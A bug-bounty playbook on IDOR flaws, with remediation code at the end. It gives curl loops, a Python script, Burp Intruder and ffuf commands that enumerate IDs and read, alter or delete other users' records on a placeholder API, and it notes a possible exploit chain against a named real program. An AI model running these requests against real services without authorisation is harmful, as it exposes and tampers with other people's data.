# IDOR (Insecure Direct Object Reference) Playbook

**Category:** Broken Access Control
**Typical Severity:** Medium–Critical
**CVSS Range:** 5.3–9.1
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

---

## Overview

IDOR vulnerabilities occur when an application uses user-controllable input to access objects without verifying that the requesting user has authorization to access that specific object. The server authenticates the user (valid JWT, valid session) but never checks whether that user *owns* or has *permission* to access the specific resource being requested.

The fix is architectural: every resource request must include an ownership check at the middleware or service layer, not just authentication.

---

## Real-World Impact

- **Mass data exposure**: Enumerate all user records by incrementing an ID
- **Payment data theft**: Access other users' order history, saved payment methods, basket contents
- **Account takeover**: Read password reset tokens, email change confirmations belonging to other users
- **Privilege escalation**: Access admin-only objects by guessing admin resource IDs
- **Data modification**: Update or delete other users' resources (IDOR write)

---

## Recon Methodology

### Step 1 — Identify object references in API responses

```bash
# Sign up for two test accounts (Account A and Account B)
# Log in as Account A, capture all API responses
# Look for numeric IDs, UUIDs, hashes in response bodies

# Common patterns to look for:
# {"id": 12345, "userId": 67890, "orderId": "abc-123"}
# /api/users/12345/profile
# /api/orders/67890
# /api/baskets/11
```

### Step 2 — Map all API endpoints that accept resource IDs

```bash
# Extract IDs from API traffic (Burp Proxy or mitmproxy)
# Look in:
# - URL path segments: /api/v1/users/{id}
# - Query parameters: ?user_id=123&order_id=456
# - Request body: {"targetUserId": 789}
# - Headers: X-User-ID, X-Account-ID
```

### Step 3 — Test with Account B's session for Account A's resources

```bash
# Get Account A's resource ID while logged in as A
# Switch to Account B's session
# Access Account A's resource ID with Account B's token
```

---

## Testing Methodology

### Test 1 — Numeric ID Enumeration

```bash
# While authenticated as user B (session_b), access user A's resource
curl "https://api.target.com/v1/users/1001/profile" \
  -H "Authorization: Bearer <session_b_token>"

# Try nearby IDs
for id in $(seq 1000 1010); do
  curl -s "https://api.target.com/v1/orders/$id" \
    -H "Authorization: Bearer <session_b_token>" | jq '.userId'
done
```

### Test 2 — UUID/Hash-Based IDOR

```bash
# UUIDs are not secret — they're just harder to guess
# Look for UUID patterns in your own resources
# Try accessing another user's UUID directly

# GUIDs in URL path
curl "https://api.target.com/v1/documents/550e8400-e29b-41d4-a716-446655440000" \
  -H "Authorization: Bearer <other_user_token>"
```

### Test 3 — IDOR Write (More Impactful)

```bash
# Modify another user's resource
curl -X PUT "https://api.target.com/v1/orders/12345" \
  -H "Authorization: Bearer <other_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 999, "shippingAddress": "attacker address"}'

# Delete another user's resource
curl -X DELETE "https://api.target.com/v1/comments/9999" \
  -H "Authorization: Bearer <other_user_token>"
```

### Test 4 — Parameter Pollution / Hidden Parameters

```bash
# Some APIs check auth but use a different parameter for the actual object
# Test adding userId/targetId to requests
curl "https://api.target.com/v1/me/profile" \
  -H "Authorization: Bearer <token>" \
  -d '{"userId": 1}'  # attempt to change which user's profile is returned
```

### Test 5 — Horizontal vs. Vertical IDOR

- **Horizontal**: User A accessing User B's data (same privilege level)
- **Vertical**: Regular user accessing admin-level objects

```bash
# Vertical IDOR — try admin resource IDs
curl "https://api.target.com/admin/users/1" \
  -H "Authorization: Bearer <regular_user_token>"

# Vertical IDOR — try privileged operations
curl -X POST "https://api.target.com/v1/users/1/promote" \
  -H "Authorization: Bearer <regular_user_token>"
```

### Test 6 — IDOR in Non-Obvious Locations

```bash
# File download endpoints
curl "https://target.com/download?fileId=1234" -H "Authorization: Bearer <other_token>"

# Export endpoints
curl "https://api.target.com/v1/export/invoices?orderId=5678" -H "Authorization: Bearer <other_token>"

# Webhook/notification endpoints
curl "https://api.target.com/v1/webhooks/9999/resend" -H "Authorization: Bearer <other_token>"

# API v1 vs v2 — older versions sometimes lack auth checks
curl "https://api.target.com/v1/users/123" -H "Authorization: Bearer <other_token>"
curl "https://api.target.com/v2/users/123" -H "Authorization: Bearer <other_token>"
```

---

## Common Endpoints to Test

| Pattern | Type | Why Test |
|---|---|---|
| `/api/users/{id}` | Horizontal | Profile PII |
| `/api/orders/{id}` | Horizontal | Order history, addresses |
| `/api/baskets/{id}` | Horizontal | Active cart state |
| `/api/messages/{id}` | Horizontal | Private messages |
| `/api/invoices/{id}` | Horizontal | Financial data |
| `/api/files/{id}` | Horizontal | Document exfil |
| `/api/admin/users/{id}` | Vertical | Privilege escalation |
| `/api/payments/{id}` | Horizontal | Payment details |
| `/api/export?userId={id}` | Horizontal | Bulk data dump |
| `/api/track-order/{id}` | Horizontal | Order tracking + address |

---

## Payload Examples

### Burp Suite Intruder — ID Enumeration

```
GET /api/v1/orders/§1§ HTTP/1.1
Host: api.target.com
Authorization: Bearer <other_user_token>

# Payload: Numbers 1–1000
# Filter on: 200 OK responses (not 403/404)
```

### Python — Automated IDOR Check

```python
import requests

token_b = "eyJ..."  # Account B's token
headers = {"Authorization": f"Bearer {token_b}"}

# Account A's known resource IDs
account_a_ids = [101, 102, 103]

for rid in account_a_ids:
    r = requests.get(f"https://api.target.com/v1/orders/{rid}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessed order {rid}: {r.json().get('userId')}")
    else:
        print(f"[BLOCKED] {rid}: {r.status_code}")
```

---

## Automation Ideas

```bash
# Autorize (Burp extension) — automatically re-sends requests with lower-privilege token
# Setup: configure Autorize with your second account's token
# Browse normally as user A — Autorize checks every request with user B's token

# arjun — discover hidden parameters that might accept user IDs
python3 arjun.py -u "https://api.target.com/v1/profile" -m GET

# ffuf — enumerate numeric IDs
ffuf -u "https://api.target.com/v1/orders/FUZZ" \
  -w <(seq 1 10000) \
  -H "Authorization: Bearer <other_token>" \
  -mc 200 -fs 0
```

---

## Real Bug Bounty Examples

### Example 1 — Instagram (Facebook, $30,000)
IDOR in the media deletion endpoint. `DELETE /api/v1/media/{media_id}/` did not verify ownership, allowing any authenticated user to delete any other user's photos.

### Example 2 — Shopify Partners ($25,000)
IDOR on the partner API allowed accessing any merchant's store data by iterating the numeric `shop_id` parameter.

### Example 3 — Various REST APIs
The most common IDOR pattern in modern apps: REST APIs that validate the JWT is valid but never check that the user ID in the JWT matches the resource owner.

---

## Lab / Program Examples

> No direct IDOR findings from current lab reports. The Boozt investigation identified a potential IDOR surface in the kronor.io basket API as a secondary finding (see `~/BugBounty/hackerone/boozt/findings/FINDING-001` — the CORS finding provides an attack vector to *exploit* an IDOR if one exists in basket ownership checks).

**Attack surface note from Boozt recon:** The `GET /rest/basket/:id` pattern on Hasura GraphQL APIs is a high-value IDOR candidate. If the basket ID is numeric and ownership is validated only by the CORS-reflected auth token (rather than server-side user-ownership check), IDOR + CORS creates a compound exploit chain.

---

## Remediation

```python
# Incorrect — only checks authentication
@app.route('/api/orders/<order_id>')
@require_auth
def get_order(order_id):
    return Order.get(order_id)  # No ownership check!

# Correct — checks authentication AND ownership
@app.route('/api/orders/<order_id>')
@require_auth
def get_order(order_id):
    order = Order.get(order_id)
    if order.user_id != current_user.id:
        abort(403)
    return order
```

The fix must be at the service/middleware layer — not in the controller. Every database query for a user-owned resource should include `WHERE user_id = :current_user_id` as a filter, not a post-fetch check.
